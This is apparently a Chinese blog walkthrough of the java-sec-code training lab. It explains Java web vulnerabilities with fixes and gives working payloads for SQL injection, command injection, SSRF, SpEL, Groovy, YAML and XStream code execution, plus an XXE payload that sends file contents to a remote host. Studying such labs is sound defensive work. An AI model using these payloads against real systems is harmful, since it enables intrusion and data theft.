---
title: java-sec-code 靶场题解
date: 2023-07-20 20:48:00
updated: 2023-07-20 20:10:00
tags: ["security","java security"]
category: Security
---

> 这个靶场包含了各类基本漏洞在java语言上的场景以及java安全特有的`JNDI`注入，反序列化，表达式注入等等，并且给出了相关的利用手段和修复方案。

## java-sec-code

### 搭建环境

可以用Docker搭建，不过想了想不太熟练java的包管理和web server部署这一套，并且本地起相比于容器也方便调试，于是决定本地起一份。由于我是`archlinux`，包管理安装的都是最新的jdk版本，靶场的jdk版本是8u102，所以遇到了在本地管理多个jdk版本的问题。我用了`archlinux-java`这个工具来解决。

#### 如何在 archlinux 管理多个jdk版本

安装jdk的话，如果装最新的版本，用`pacman`或者`yay`即可，如果需要装比较旧的jdk版本，那么就需要从oracle上下载一个对应的jdk版本，解压后放在`/usr/lib/jvm`下，例如我这里这个`java-8u102-是自己下载解压的，其他都是包管理装的。

![image-20230622162108718](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622162108718.png)

用`archlinux-java`指定这个目录，目录下的`./bin/java`,`./bin/javac`都会变成命令行中默认的`java`,`javac`版本。

![image-20230622162345831](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622162345831.png)

那么`archlinux-java`这个工具是怎么实现多个`jdk`版本管理的呢，找了一圈发现这个命令来自包` java-runtime-common`，但是arch wiki上貌似没有看到源码，只有一份编译后的，于是简单摸索了一下。

首先在命令行执行的命令，其实是因为对应的可执行文件所在的目录，在`PATH`这个环境变量中，因此可以找到对应目录的可执行文件并且调用，那么`/usr/bin`目录是默认在PATH中的。

工具是通过`/usr/bin`下的一个软链接到`/usr/lib/jvm/default/bin`下面的文件，而`/usr/lib/jvm/default/bin`是软连接到对应的`/usr/lib/jvm`下面对应的jdk目录的，`archlinux-java`的作用就是切换软连接，让`default-runtime`下的软链接，链接到对应的`jdk`目录`。

![image-20230622163102897](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622163102897.png)

![image-20230622162947001](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622162947001.png)

#### 如何在 MacOS 管理多个jdk版本

> 由于实习发了Macbook pro，并且是m2，所以是arm架构的，就重新配了本地环境。

`MacOS`我没了解到有什么`jdk`版本管理工具，所以就选择手动管理`JDK`版本，也不复杂。

由于`jdk8u102`这样老版本出现的时候，还没有`ARM`架构的`MacOS`，所以各个下载`JDK`的站点，只有到`8u2xx`的版本之后才有`ARM`架构的。不过协会的朋友告诉我，我可以直接用`X86`的，`ARM`架构的`MACOS`会自动做转译，所以直接下`X86`的就行啦。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230719164427.png)

安装后都在`/Library/Java/JavaVirtualMachines`下，给`.zshrc/.bashrc`配置一下，在命令行使用那就手动切换一下，如果在`IDEA`这样的场景那就手动选择一下`JDK`所在目录就ok。

```
export JAVA_8u102_HOME="/Library/Java/JavaVirtualMachines/openjdk8u102/Contents/Home"
export JAVA_8u372_HOME="/Library/Java/JavaVirtualMachines/openjdk8u372/Contents/Home"

alias java8u102='export JAVA_HOME=$JAVA_8u102_HOME'
alias java8u372='export JAVA_HOME=$JAVA_8u372_HOME'

java8u372
```

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230719165205.png)

#### 启动靶机

有了对应的jdk版本之后，用maven装一下依赖，拉一个mysql的docker镜像，就能正常起靶机了。

![image-20230622164221586](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230622164221586.png)

> 项目的首页和Wiki都没有展示所有的路由，可能是项目后面又有更新但是文档没更，也可能是作者只想写一些关键的点原因吧，我还是按照controller里面的路由一个一个看下来。

### PathTraversal

目录穿越`/path_traversal/vul?filepath=../../../../../etc/passwd`

修复方案：

将`.`和`/`设置为黑名单，也可以将传入参数拼接后，判断此时是不是在允许读文件的目录下，来做对应的返回。

### CommandInject

> 踩坑了，具体可以看这个issue：`https://github.com/JoyChou93/java-sec-code/issues/78`

一种是读文件情形，`http://localhost:8080/codeinject?filepath=/tmp;cat /flag`

一种是`curl`传入的host，`host: localhost;cat /flag`

![image-20230624105539368](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20230624105539368.png)

修复方案：

`^[a*-*zA*-*Z0*-*9_/\\.-]+$`正则匹配用户传入内容。

### RCE
#### runtime exec

```java
@GetMapping("/runtime/exec")  
public String CommandExec(String cmd) {  
Runtime run = Runtime.getRuntime();  
StringBuilder sb = new StringBuilder();  
  
try {  
Process p = run.exec(cmd);  
BufferedInputStream in = new BufferedInputStream(p.getInputStream());  
BufferedReader inBr = new BufferedReader(new InputStreamReader(in));  
String tmpStr;  
  
while ((tmpStr = inBr.readLine()) != null) {  
sb.append(tmpStr);  
}  
  
if (p.waitFor() != 0) {  
if (p.exitValue() == 1)  
return "Command exec failed!!";  
}  
  
inBr.close();  
in.close();  
} catch (Exception e) {  
return e.toString();  
}  
return sb.toString();  
}
```
#### ProcessBuilder

```java
@GetMapping("/ProcessBuilder")  
public String processBuilder(String cmd) {  
  
StringBuilder sb = new StringBuilder();  
  
try {  
String[] arrCmd = {"/bin/sh", "-c", cmd};  
ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);  
Process p = processBuilder.start();  
BufferedInputStream in = new BufferedInputStream(p.getInputStream());  
BufferedReader inBr = new BufferedReader(new InputStreamReader(in));  
String tmpStr;  
  
while ((tmpStr = inBr.readLine()) != null) {  
sb.append(tmpStr);  
}  
} catch (Exception e) {  
return e.toString();  
}  
  
return sb.toString();  
}
```
#### js
```
http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js  
 
curl http://xx.yy/zz.js  
var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
```

```java
@GetMapping("/jscmd")  
public void jsEngine(String jsurl) throws Exception{  
// js nashorn javascript ecmascript  
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");  
Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);  
String cmd = String.format("load(\"%s\")", jsurl);  
engine.eval(cmd, bindings);  
}
```

#### yaml

> yaml-payload.jar: https://github.com/artsploit/yaml-payload  
 
`http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]`
```java
@GetMapping("/vuln/yarm")  
public void yarm(String content) {  
Yaml y = new Yaml();  
// 正确写法：Yaml y = new Yaml(new SafeConstructor());
y.load(content);  
}
```

#### groovy

`http://localhost:8080/rce/groovy?content="open -a Calculator".execute()`

```java
@GetMapping("groovy")  
public void groovyshell(String content) {  
GroovyShell groovyShell = new GroovyShell();  
groovyShell.evaluate(content);  
}
```
### SqlInject

sql注入的问题可能是直接执行了`raw sql`,并且手动拼接;也可能是没有正确使用`orm`框架，参数指定的位置不正确。

#### raw sql

```java
// 手拼raw sql
Statement statement = con.createStatement();
String sql = "select * from users where username = '" + username + "'";
ResultSet rs = statement.executeQuery(sql);
```

`/sqli/jdbc/vuln?username=joychou' or 1=1%23`

#### Incorrect prepareStatement

```java
// PreparedStatement 是java原生的sql预编译函数
// 这里应该用?表示预编译的字符串
String sql = "select * from users where username = '" + username + "'";
PreparedStatement st = con.prepareStatement(sql);
ResultSet rs = st.executeQuery();
```

`/sqli/jdbc/ps/vuln?username=joychou' or 'a'='a'%23`

#### Incorrect mybatis

```java
// 用${}不会预编译，应该用#{}
// SQLI.java
@GetMapping("/mybatis/vuln01")
public List<User> mybatisVuln01(@RequestParam("username") String username) {
    return userMapper.findByUserNameVuln01(username);
    }

// UserMapper.java
@Select("select * from users where username = '${username}'")
List<User> findByUserNameVuln01(@Param("username") String username);

```

`/sqli/mybatis/vuln01?username=joychou' or '1'='1'%23`

```java
// 应该用#{}
// SQLI.java
@GetMapping("/mybatis/vuln02")
public List<User> mybatisVuln02(@RequestParam("username") String username) {
    return userMapper.findByUserNameVuln02(username);
    }

// UserMapper.java
List<User> findByUserNameVuln02(String username);

// UserMapper.xml
    <select id="findByUserNameVuln02" parameterType="String" resultMap="User">
        select * from users where username like '%${_parameter}%'
    </select>
```

`/sqli/mybatis/vuln02?username=joychou' or '1'='1'%23`

```java
// SQLI.java
@GetMapping("/mybatis/orderby/vuln03")
public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
    return userMapper.findByUserNameVuln03(sort);
    }

// UserMapper.java
List<User> findByUserNameVuln03(@Param("order") String order);

// UserMapper.xml
  <select id="findByUserNameVuln03" parameterType="String" resultMap="User">
        select * from users
        <if test="order != null">
            order by ${order} asc
        </if>
    </select>
```

`/sqli/mybatis/orderby/vuln03?sort=id desc--`

修复方案：

正确使用`orm`框架，预编译传入的参数。

### SSRF

> 参考文章：https://joychou.org/java/javassrf.html

java的ssrf不支持gopher协议，也不能通过重定向来使用其他协议，所以主要的利用方法是通过file和http协议。

`import sun.net.www.protocol`可知，支持`file ftp mailto http https jar netdoc`。

能发起网络请求的类：
```
- URLConnection
- URL
- HttpClient
- HttpURLConnection
- Request
- HttpAsyncClients
- okHttpClient
```
其中名字带有`http`的类仅支持`http(s)`，而`URLConnection`和`URL`这两个类发起的请求支持上面所提到的协议。

不同的类发起的请求`UA`不太一样，所以如果遇到可能是`SSRF`的场景，可以通过`UA`帮助判断背后的代码用的哪个类。

#### URLConnection
支持`file`，可以任意文件读

```java
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
```

`/ssrf/urlConnection/vuln?url=file:///flag`

#### URL

`URL`类的三个常见用法

```java
new URL(String url).openConnection()
new URL(String url).openStream()
new URL(String url).getContent()
```

这是一个文件下载的场景，用了`openStream()`。

```java
String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);  
// download  
response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);  
  
URL u = new URL(url);  
int length;  
byte[] bytes = new byte[1024];  
inputStream = u.openStream(); // send request  
outputStream = response.getOutputStream();  
while ((length = inputStream.read(bytes)) > 0) {  
outputStream.write(bytes, 0, length);  
}
```

`URL`类，支持`file `协议。

`http://localhost:8080/ssrf/openStream?url=file:///etc/passwd`

#### HttpClient
```java
CloseableHttpClient client = HttpClients.createDefault();  
HttpGet httpGet = new HttpGet(url);  
HttpResponse httpResponse = client.execute(httpGet);  
BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
```

只有`http(s)`协议可用的情况，主要利用就是探测内网。

#### commonsHttpClient

```java
HttpClient client = new HttpClient();  
GetMethod method = new GetMethod(url);  
  
try {  
client.executeMethod(method); // send request  
byte[] resBody = method.getResponseBody();  
return new String(resBody);  
  
} catch (IOException e) {  
return "Error: " + e.getMessage();  
} finally {  
// Release the connection.  
method.releaseConnection();  
```

另一种HttpClient的写法，发出去的包`UA`不一样。

#### HttpURLConnection
```java
URL u = new URL(url);  
URLConnection urlConnection = u.openConnection();  
HttpURLConnection conn = (HttpURLConnection) urlConnection;  
InputStream is = conn.getInputStream(); 
BufferedReader in = new BufferedReader(new InputStreamReader(is));
```

只有`http(s)`协议可用的情况，主要利用就是探测内网。

#### Request

`Request` 类，是封装后的`HTTPClient`，开发用起来很方便，`Request.Get(url).execute().returnContent().toString();`就可以。

利用情景也是限制`http`协议，主要利用就是探测内网。

#### HTTPSyncClients

```java
CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();  
try {  
httpclient.start();  
final HttpGet request = new HttpGet(url);  
Future<HttpResponse> future = httpclient.execute(request, null);  
HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);  
return EntityUtils.toString(response.getEntity());  
} catch (Exception e) {  
return e.getMessage();  
} finally {  
try {  
httpclient.close();  
} catch (Exception e) {  
logger.error(e.getMessage());  
}  
}
```

应该是用于延时发`HTTP`请求的类，限制只能`http`协议。

#### okHttpClient

```java
OkHttpClient client = new OkHttpClient();   
com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();  
return client.newCall(ok_http).execute().body().string();
```

#### ImageIO

```java
try {  
URL u = new URL(url);  
ImageIO.read(u); // send request  
} catch (IOException e) {  
logger.error(e.getMessage());  
}
```

#### Jsoup

```java
try {  
Document doc = Jsoup.connect(url)  
// .followRedirects(false)  
.timeout(3000)  
.cookie("name", "joychou") // request cookies  
.execute().parse();  
return doc.outerHtml();  
} catch (IOException e) {  
return e.getMessage();  
}
```

 `Jsoup`是用来解析`HTML`的类，也可以发请求。

#### IOUtils

```java
try {  
IOUtils.toByteArray(URI.create(url));  
} catch (IOException e) {  
logger.error(e.getMessage());  
}
```
`IOUtils`是用`URLConnection`封装的，通常用来从远程下载图片。

#### RestTemplate

```java
public String RequestHttp(String url, HttpHeaders headers) {  
HttpEntity<String> entity = new HttpEntity<>(headers);  
ResponseEntity<String> re = restTemplate.exchange(url, HttpMethod.GET, entity, String.class);  
return re.getBody();  
}
```
用`spring`封装的`RestTemplate`方法，只支持`HTTP`，并且默认只有`GET`允许重定向。

#### hutool
```java
return HttpUtil.get(url);
```
`hutool`的特点是不会跟随重定向。

#### DNS Rebinding

应用默认配置TTL为10s，如果手动修改`TTL`，比如说修改为`0`，会导致`DNS Rebinding`攻击，可以绕过黑白名单限制。

#### 修复方案

重定向攻击：java场景默认跟随重定向，但是如果跳转访问的协议不一致，不能成功跳转。
DNS Rebinding：应用默认配置TTL为10s，不受DNS Rebinding影响。

因此主要的策略为：
- 限制协议为`HTTP/HTTPS`
- 黑白名单限制

### SSTI

模板注入问题各个语言都有，`java-sec-code`中只放了`velocity`，其实除了`velocity`，`thymeleaf`等都是会有`SSTI`的问题。

#### velocity

```velocity
set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open%20-a%20Calculator")
```

### Get Real IP

```java
String ip = request.getHeader("X-Real-IP");  
if (StringUtils.isNotBlank(ip)) {  
return ip;  
} else {  
String remoteAddr = request.getRemoteAddr();  
if (StringUtils.isNotBlank(remoteAddr)) {  
return remoteAddr;  
}  
}  
return "";
```

如果用这样的方法从请求头获取`IP`，可以伪造`HTTP`请求头绕过黑名单。

直接`return request.getRemoteAddr();`就可以。

### Get Request URI

由于`Spring`提供的`getRequestURI`和`getPathInfo`存在差异导致的安全问题。当然`Spring-security`提供的鉴权方案正确的使用了`getPathInfo`，如果开发者使用`spring`开发并且手写鉴权的情况下，就有可能出现这个问题。（在这个靶场是复现不了的因为采用了`spring-security`的鉴权，作者想讲的是这个思想。）

函数**_getRequestURI()_** **返回完整的请求的 URI。**这包括部署文件夹和 servlet 映射字符串。它还将返回所有额外的路径信息。

函数**_getPathInfo()_** **仅返回传递给 servlet 的路径**。如果没有传递额外的路径信息，该函数将返回_null_。

换句话说，如果我们将应用程序部署在 Web 服务器的根目录中，并且**请求映射到“/”的 servlet，则_getRequestURI()_和_getPathInfo()_将返回相同的字符串**。否则，我们会得到不同的值。

```java
@RestController  
@RequestMapping("uri")  
public class GetRequestURI {  
  
private final Logger logger = LoggerFactory.getLogger(this.getClass());  
  
@GetMapping(value = "/exclued/vuln")  
public String exclued(HttpServletRequest request) {  
  
String[] excluedPath = {"/css/**", "/js/**"};  
String uri = request.getRequestURI(); // Security: request.getServletPath()  
PathMatcher matcher = new AntPathMatcher();  
  
logger.info("getRequestURI: " + uri);  
logger.info("getServletPath: " + request.getServletPath());  
  
for (String path : excluedPath) {  
if (matcher.match(path, uri)) {  
return "You have bypassed the login page.";  
}  
}  
return "This is a login page >..<";  
}  
}
```

### CRLF Injection

```java
@RequestMapping("/safecode")  
@ResponseBody  
public void crlf(HttpServletRequest request, HttpServletResponse response) {  
response.addHeader("test1", request.getParameter("test1"));  
response.setHeader("test2", request.getParameter("test2"));  
String author = request.getParameter("test3");  
Cookie cookie = new Cookie("test3", author);  
response.addCookie(cookie);  
}
```

`jdk1.7`开始就不会有`CRLF`的问题了

### XXE

XXE 常见的利用场景根据有无回显区分，无回显需要将返回结果带出，有回显则不用。

Payload:

```xml
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE joychou [

<!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<root>&xxe;</root>
```
带有ENTITY可能会被WAF拦截，可以优化成从远程加载`dtd`文件，被拦的可能比较小。
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://test.joychou.org/evil.dtd">
```

```xml
<!ENTITY % data SYSTEM "file:///tmp/x">
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://test.joychou.org/?data=%data;'>">
%payload;
%send;
```
#### XMLReader
```java
XMLReader xmlReader = XMLReaderFactory.createXMLReader();  
xmlReader.parse(new InputSource(new StringReader(body))); // parse xml  
return "xmlReader xxe vuln code";
```
#### SAXBuilder
```java
SAXBuilder builder = new SAXBuilder();  
// org.jdom2.Document document  
builder.build(new InputSource(new StringReader(body))); // cause xxe  
return "SAXBuilder xxe vuln code";
```
#### SAXReader
```java
SAXReader reader = new SAXReader();  
// org.dom4j.Document document  
reader.read(new InputSource(new StringReader(body))); // cause xxe
```
#### SAXParser
```java
SAXParserFactory spf = SAXParserFactory.newInstance();  
SAXParser parser = spf.newSAXParser();  
parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml
```
#### Digester
```java
Digester digester = new Digester();  
digester.parse(new StringReader(body)); // parse xml
```
#### DocumentBuilder
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();  
DocumentBuilder db = dbf.newDocumentBuilder();  
InputSource is = new InputSource(request.getInputStream());  
Document document = db.parse(is); // parse xml  
  
// 遍历xml节点name和value  
StringBuilder buf = new StringBuilder();  
NodeList rootNodeList = document.getChildNodes();  
for (int i = 0; i < rootNodeList.getLength(); i++) {  
Node rootNode = rootNodeList.item(i);  
NodeList child = rootNode.getChildNodes();  
for (int j = 0; j < child.getLength(); j++) {  
Node node = child.item(j);  
buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));  
}  
}  
return buf.toString();
```
#### Xinclude
```java
String body = WebUtils.getRequestBody(request);  
logger.info(body);  
  
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();  
dbf.setXIncludeAware(true); // 支持XInclude  
dbf.setNamespaceAware(true); // 支持XInclude  
DocumentBuilder db = dbf.newDocumentBuilder();  
StringReader sr = new StringReader(body);  
InputSource is = new InputSource(sr);  
Document document = db.parse(is); // parse xml  
  
NodeList rootNodeList = document.getChildNodes();  
response(rootNodeList);  
  
sr.close();  
return "DocumentBuilder xinclude xxe vuln code";
```

#### xmlbeam CVE-2018-1259

```java
return ResponseEntity.ok(String.format("hello, %s!", user.getUserName()));
```

#### poi-ooxml CVE-2017-5644
> https://www.itread01.com/hkpcyyp.html
> https://nvd.nist.gov/vuln/detail/CVE-2017-5644


#### xlsx-streamer CVE-2022-23640
> [CVE-2022-23640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23640)


### Cookies

`Cookies`设置本身的安全问题就是比如`key`或者`value`会暴露一些信息，以及一些比较笨的校验，比如说校验`Cookie`中的明文值`role = admin`这样的情况。现在主流的开发都会使用`JWT`或者返回一个`uuid`来作为`token`，这样的情况比较少。

### JWT

> https://github.com/JoyChou93/java-sec-code/wiki/JWT

`JWT`是`JSON Web Token`，是一种客户端`Session`机制。`JWT`分三部分，第一部分是签名算法，第二部分是内容，第三部分是签名。

由于第一二部分的内容都是`base64`编码的，所以其实可以看到其中信息，但是用签名来校验内容，因此对于后端来说，只要签名校验正确就可以认为是没有被修改过的，只要签名用的`secret`强度高，不暴露，使用的库和函数本身没有什么漏洞，那就没问题。

### URL白名单绕过

> https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass
> https://www.secpulse.com/archives/67064.html

如果获取根域名的方法不正确，或者校验的函数用的不正确，就会导致绕过白名单的情况。

|POC|url|getHost|Chrome|是否绕过|是否能跟path|
|:-:|:-:|:-:|:-:|:-:|:-:|
|[http://evil.com%23@www.joychou.org/a.html](http://evil.com%23@www.joychou.org/a.html)|[http://evil.com#@www.joychou.org/a.html](http://evil.com/#@www.joychou.org/a.html)|[www.joychou.org](http://www.joychou.org/)|[http://evil.com/](http://evil.com/)|是|不能|
|[http://evil.com%5c@www.joychou.org/a.html](http://evil.com%5c@www.joychou.org/a.html)|[http://evil.com\@www.joychou.org/a.html](http://evil.com%5C@www.joychou.org/a.html)|[www.joychou.org](http://www.joychou.org/)|[http://evil.com/@www.joychou.org/a.html](http://evil.com/@www.joychou.org/a.html)|是|能|
|[http://evil.com%5cwww.joychou.org/a.html](http://evil.com%5Cwww.joychou.org/a.html)|[http://evil.com\www.joychou.org/a.html](http://evil.com%5Cwww.joychou.org/a.html)|evil.com\www.joychou.org|[http://evil.com/www.joychou.org/a.html](http://evil.com/www.joychou.org/a.html)|是|能|

#### endswith

```java
host.endsWith(domain)
```

本意是匹配`*.example.com`，但是`xxxxexample.com`也可以符合。

#### contains

```java
host.contains(domain)
```

`example.com.xxxx.com`就行。

#### regex

正则的一些可能就是正则表达式写的不正确。导致出现和`endwith`，`contains`类似的绕过情况。

#### url_bypass

```java
URL u = new URL(url);  
String host = u.getHost();  
logger.info("host: " + host);  
  
// endsWith .  
for (String domain : domainwhitelist) {  
if (host.endsWith("." + domain)) {  
res.sendRedirect(url);  
}  
}
```

用了`endswith`的情况下，如果用`getHost()`来获取域名，那么可以用`example.com@aaa.com`来绕过，`getHost()`会取到`@`前。

Payload List：

> 在`url`上做手脚的一些`trick`

- [http://www.joychou.org.evil.com](http://www.joychou.org.evil.com/)
- [http://www.eviljoychou.org](http://www.eviljoychou.org/)
- [http://www.evil.com/www.joychou.org/](http://www.evil.com/www.joychou.org/)
- [http://www.joychou.org#@evil.com](http://www.joychou.org/#@evil.com)
- [http://evil.com\www.joychou.org/a.html](http://evil.com%5Cwww.joychou.org/a.html)
- [http://evil.com\@www.joychou.org/a.html](http://evil.com%5C@www.joychou.org/a.html)
- [http://evil.com#@www.joychou.org](http://evil.com/#@www.joychou.org)
- [http://evil.com?%0a@www.joychou.org/](http://evil.com/?%0a@www.joychou.org/)

### 开放重定向

在一些业务场景中，会有跳转的需求，那么如果是后端来做跳转，也就是前端发送`HTTP`请求后，后端认为需要跳转，会通过返回对应的301/302等响应码进行重定向，如果对参数控制不严格会导致控制重定向到恶意链接的情况，进而造成一些反射型XSS，CSRF，钓鱼等等。

漏洞代码：

```java
@GetMapping("/redirect")  
public String redirect(@RequestParam("url") String url) {  
return "redirect:" + url;  
}

@RequestMapping("/setHeader")  
@ResponseBody  
public static void setHeader(HttpServletRequest request, HttpServletResponse response) {  
String url = request.getParameter("url");  
response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect  
response.setHeader("Location", url);  
}

@RequestMapping("/sendRedirect")  
@ResponseBody  
public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {  
String url = request.getParameter("url");  
response.sendRedirect(url); // 302 redirect  
}
```

用`HttpServletRequest.getRequestDispatcher`可以校验`url`为当前域名。
```java
@RequestMapping("/forward")  
@ResponseBody  
public static void forward(HttpServletRequest request, HttpServletResponse response) {  
String url = request.getParameter("url");  
RequestDispatcher rd = request.getRequestDispatcher(url);  
try {  
rd.forward(request, response);  
} catch (Exception e) {  
e.printStackTrace();  
}  
}
```


### CORS
> https://github.com/JoyChou93/java-sec-code/wiki/CORS

跨域问题主要是正确配置响应头，不要把`Access-Control-Allow-Origin` 配置成`origin`或者`*`，需要接收来自哪个域的请求就回对应的域名。

### JSONP

`jsonp`和`cors`都是跨域解决方案，不过貌似已经比较过时，有空回来补吧，懒得看了

### XSS

`xss`是客户端侧的攻击手法，这里主要是介绍了反射型和存储型。

#### 反射型

```java
@RequestMapping("/reflect")  
@ResponseBody  
public static String reflect(String xss) {  
return xss;  
}
```

#### 存储型

```java
@RequestMapping("/stored/store")  
@ResponseBody  
public String store(String xss, HttpServletResponse response) {  
Cookie cookie = new Cookie("xss", xss);  
response.addCookie(cookie);  
return "Set param into cookie";  
}

@RequestMapping("/stored/show")  
@ResponseBody  
public String show(@CookieValue("xss") String xss) {  
return xss;  
}
```
#### 修复方案

如果是存储型`XSS`，数据会到后端存储，那么对于几个关键`HTML`字符的转义很有效，前端也可以选择一些像`DOMPurify`这样的库来过滤回显内容。

### CSRF

这里主要讲`csrf`的防御如何实现，用`spring-security`的`csrf_token`来防止`csrf`攻击。简单来说，在用户访问页面时，后端会给前端一个`csrf_token`，只有请求接口时带上这个`csrf_token`，才会被认为是安全的，而通过点击伪造的恶意链接发出的请求，由于跨域并不能够带上`csrf_token`。

### File Upload

文件上传在`spring`技术栈中基本没有，因为首先大多数公司上传的文件都会到`cdn`，其次就算是传到`Web`服务器上，`spring`的`jsp`文件必须在`web-inf`目录下才能执行，那么如果是有目录穿越的情形，又不限制上传的文件后缀和内容，那就可以通过传定时任务/覆盖动态链接库/覆盖可执行文件等等办法来`RCE`，所以这种上传`jsp`去`RCE`的场景太局限了。

一段良好的图片上传代码，对`MIME`，后缀，文件名和目录都做了对应处理。

```java
// 判断文件后缀名是否在白名单内 校验1  
String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};  
boolean suffixFlag = false;  
for (String white_suffix : picSuffixList) {  
if (Suffix.toLowerCase().equals(white_suffix)) {  
suffixFlag = true;  
break;  
}  
}  
if (!suffixFlag) {  
logger.error("[-] Suffix error: " + Suffix);  
deleteFile(filePath);  
return "Upload failed. Illeagl picture.";  
}  
  
  
// 判断MIME类型是否在黑名单内 校验2  
String[] mimeTypeBlackList = {  
"text/html",  
"text/javascript",  
"application/javascript",  
"application/ecmascript",  
"text/xml",  
"application/xml"  
};  
for (String blackMimeType : mimeTypeBlackList) {  
// 用contains是为了防止text/html;charset=UTF-8绕过  
if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {  
logger.error("[-] Mime type error: " + mimeType);  
deleteFile(filePath);  
return "Upload failed. Illeagl picture.";  
}  
}  
  
// 判断文件内容是否是图片 校验3  
boolean isImageFlag = isImage(excelFile);  
deleteFile(randomFilePath);  
  
if (!isImageFlag) {  
logger.error("[-] File is not Image");  
deleteFile(filePath);  
return "Upload failed. Illeagl picture.";  
}  
  
  
try {  
// Get the file and save it somewhere  
byte[] bytes = multifile.getBytes();  
Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());  
Files.write(path, bytes);  
} catch (IOException e) {  
logger.error(e.toString());  
deleteFile(filePath);  
return "Upload failed";  
}
```


### SpEL

`SpEL`是`Spring Expression Language`，也就是`Spring`的表达式，会有表达式注入的问题。

```java
ExpressionParser parser = new SpelExpressionParser();  
// fix method: SimpleEvaluationContext  
return parser.parseExpression(expression).getValue().toString();
```

可以直接通过表达式调用方法，实现`RCE`。

```java
http://localhost:8080/spel/vuln/?expression=T(java.lang.Runtime).getRuntime().exec(%22/System/Applications/Calculator.app/Contents/MacOS/Calculator%22)
```
### Java RMI

### Deserialize

这里是模拟了一个类似 shiro 反序列化漏洞的场景，会把`cookie`的内容反序列化。

```java
@RequestMapping("/rememberMe/vuln")  
public String rememberMeVul(HttpServletRequest request)  
throws IOException, ClassNotFoundException {  
  
Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);  
if (null == cookie) {  
return "No rememberMe cookie. Right?";  
}  
  
String rememberMe = cookie.getValue();  
byte[] decoded = Base64.getDecoder().decode(rememberMe);  
  
ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);  
ObjectInputStream in = new ObjectInputStream(bytes);  
in.readObject();  
in.close();  
  
return "Are u ok?";  
}
```
依赖中有`commons-collections`，版本为`3.1`。

可以打`cc5`的反序列化链子。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230720161403.png)


### Fastjson 1.2.24
> fastjson最早爆出的漏洞的版本，这里介绍两条常见的利用链。

#### TemplatesImpl

通过构造一个 TemplatesImpl 类的反序列化字符串，其中 `_bytecodes` 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 `newInstance()` 实例化。

在反序列化过程中，由于getter方法 `getOutputProperties()`，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：`getOutputProperties()` -> `newTransformer()` -> `getTransletInstance()` -> `defineTransletClasses()` / `EvilClass.newInstance()`.

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230720164530.png)


#### JdbcRowSetImpl

这个利用链最终是通过`javax.naming.InitialContext#lookup()` 参数可控导致的 JNDI 注入。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230720164133.png)


### XStream CVE-2019-10173
> https://nosec.org/home/detail/2813.html

```xml
<sorted-set>  
<string>foo</string>  
<dynamic-proxy>  
<interface>java.lang.Comparable</interface>  
<handler class="java.beans.EventHandler">  
<target class="java.lang.ProcessBuilder">  
<command>  
<string>/System/Applications/Calculator.app/Contents/MacOS/Calculator</string>  
</command>  
</target>  
<action>start</action>  
</handler>  
</dynamic-proxy>  
</sorted-set>
```
XStream是Java类库，用来将对象序列化成XML(JSON)或反序列化为对象。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230720170849.png)

### Log4j CVE-2021-44228
> 这是非常出名的log4j的cve，是一个jndi注入的问题。

